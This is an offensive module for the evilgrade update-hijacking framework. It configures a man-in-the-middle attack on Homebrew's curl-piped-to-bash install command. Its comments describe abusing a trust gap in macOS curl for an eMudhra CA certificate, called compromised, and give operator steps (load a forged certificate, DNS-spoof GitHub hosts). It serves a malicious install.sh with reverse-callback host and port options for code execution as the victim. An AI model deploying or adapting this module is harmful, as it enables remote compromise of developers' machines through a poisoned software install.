###############
# homebrew_update.pm
#
# Homebrew install one-liner MITM via the compromised eMudhra CA.
#
# The documented Homebrew install command is:
#   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
#
# install.sh is fetched with /usr/bin/curl and piped straight into bash.
# curl's default backend (LibreSSL + /etc/ssl/cert.pem) still trusts the
# revoked, Apple-blocked eMudhra intermediate "EM DV TLS CA - G3C"
# (SHA-256 62:B7:F9:86...), so an on-path attacker serving an eMudhra-signed
# raw.githubusercontent.com certificate replaces install.sh and gets code
# execution as the victim user. Apple's Secure Transport backend blocks it;
# curl/git/python using cert.pem do not.
#
# Use with:  set sslcert certs/emudhra_mitm   (eMudhra-signed cert for the
# GitHub hosts), then DNS-spoof raw.githubusercontent.com to this host.
#
# This file is part of isr-evilgrade, www.faradaysec.com .
##
package modules::homebrew_update;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'Homebrew install one-liner MITM (eMudhra CA)',
    'version'     => '1.0',
    'appver'      => 'macOS /usr/bin/curl (LibreSSL / cert.pem backend)',
    'cve'         => 'eMudhra intermediate key compromise (2026)',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Intercepts the Homebrew install one-liner. Serves a malicious install.sh in
place of Homebrew's, which curl pipes into bash -> code execution as the user.
Works because /usr/bin/curl trusts the revoked eMudhra intermediate via
/etc/ssl/cert.pem (Apple's block list only covers Secure Transport). Set
'sslcert' to certs/emudhra_mitm (eMudhra-signed cert for the GitHub hosts).
},
    # evilgrade matches the request Host header against this regex.
    'vh' => '(raw.githubusercontent.com|raw.github.com|objects.githubusercontent.com|github.com)',
    'request' => [
        {   'req'    => '/.*install.*\.sh|/.*/HEAD/.*',
            'type'   => 'file',
            'method' => '',
            'bin'    => 0,
            'string' => '',
            'parse'  => 1,                # expand <%LHOST%> / <%LPORT%>
            'file'   => './include/homebrew/install.sh',
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: text/x-shellscript\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],

    'options' => {
        'enable' => { 'val' => 0, 'desc' => 'Status' },
        # The served payload is the shell script (type=file below). evilgrade's
        # webserver still requires an 'agent' option to exist, so point it at a
        # real file; it is not used for the script response.
        'agent'  => { 'val' => './include/homebrew/install.sh', 'desc' => 'Required by webserver (unused; script is served via file)' },
        'lhost'  => { 'val' => '127.0.0.1', 'desc' => 'Reverse-callback host written into the served install.sh' },
        'lport'  => { 'val' => '4444',      'desc' => 'Reverse-callback port written into the served install.sh' },
    }
};

sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
